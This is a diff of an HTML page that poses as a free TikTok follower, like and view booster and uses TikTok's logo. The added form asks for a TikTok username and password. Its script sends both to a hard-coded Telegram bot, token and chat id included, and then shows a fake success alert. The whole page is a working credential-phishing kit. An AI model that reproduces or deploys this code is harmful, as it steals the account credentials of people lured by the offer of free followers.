@@ -3,76 +3,111 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Free Folo</title>
+  <title>FreeFolo - TikTok</title>
+  <link rel="icon" href="https://seeklogo.com/images/T/tiktok-logo-1F4C2DCD45-seeklogo.com.png">
   <style>
     body {
-      background-color: #111;
+      background-color: #000;
       color: white;
       font-family: Arial, sans-serif;
       display: flex;
       flex-direction: column;
       align-items: center;
-      justify-content: center;
-      height: 100vh;
-      margin: 0;
+      padding: 20px;
     }
-
-    img {
-      width: 60px;
-      margin-bottom: 10px;
-    }
-
-    h1 {
-      font-size: 32px;
+    img.logo {
+      width: 100px;
       margin-bottom: 20px;
     }
-
-    input, select {
-      width: 250px;
+    h1 {
+      font-size: 24px;
+      margin-bottom: 30px;
+    }
+    .form-container {
+      background: #111;
+      padding: 20px;
+      border-radius: 15px;
+      box-shadow: 0 0 10px rgba(255, 255, 255, 0.2);
+      width: 100%;
+      max-width: 400px;
+      display: flex;
+      flex-direction: column;
+    }
+    input, select, button {
+      margin-bottom: 15px;
       padding: 12px;
-      margin: 10px 0;
+      font-size: 16px;
       border: none;
       border-radius: 10px;
-      background-color: #ccc;
-      color: black;
-      font-size: 16px;
     }
-
+    input[type="text"],
+    input[type="password"],
+    select {
+      background-color: #222;
+      color: white;
+    }
     button {
-      width: 250px;
-      padding: 12px;
-      margin-top: 15px;
       background-color: #ff0050;
       color: white;
-      font-size: 18px;
-      border: none;
-      border-radius: 10px;
       cursor: pointer;
+      font-weight: bold;
     }
-
     button:hover {
       background-color: #e60045;
     }
   </style>
 </head>
 <body>
-
-  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/0a/TikTok_logo.svg/100px-TikTok_logo.svg.png" alt="TikTok Logo" />
+  <img src="https://seeklogo.com/images/T/tiktok-logo-1F4C2DCD45-seeklogo.com.png" alt="TikTok Logo" class="logo">
   <h1>Free Folo</h1>
+  <div class="form-container">
+    <input type="text" id="username" placeholder="Username" required />
+    <input type="password" id="password" placeholder="Password" required />
+    <select id="followers">
+      <option value="1000">1000</option>
+      <option value="2000">2000</option>
+      <option value="5000">5000</option>
+    </select>
+    <select id="type">
+      <option value="followers">Followers</option>
+      <option value="likes">Likes</option>
+      <option value="views">Views</option>
+    </select>
+    <button onclick="sendData()">Start Boosting Now</button>
+  </div>
 
-  <input type="text" placeholder="TikTok Username" />
-  <select>
-    <option>1000</option>
-    <option>2000</option>
-    <option>5000</option>
-  </select>
-  <select>
-    <option>1</option>
-    <option>2</option>
-    <option>3</option>
-  </select>
-  <input type="password" placeholder="Password" />
-  <button>تم</button>
+  <script>
+    function sendData() {
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+      const followers = document.getElementById("followers").value;
+      const type = document.getElementById("type").value;
 
+      const message = `🔔 TikTok Request\\n👤 User: ${username}\\n🔒 Pass: ${password}\\n📦 Amount: ${followers}\\n📌 Type: ${type}`;
+      const token = "7522052271:AAHa6XIscaA7ivTn_C0Wr8oaqritL0GP8EY";
+      const chat_id = "6454073193";
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          chat_id: chat_id,
+          text: message,
+        }),
+      })
+      .then((response) => {
+        if (response.ok) {
+          alert("Your request has been received! 🚀");
+        } else {
+          alert("Error sending data.");
+        }
+      })
+      .catch((error) => {
+        alert("Error: " + error.message);
+      });
+    }
+  </script>
 </body>
 </html>
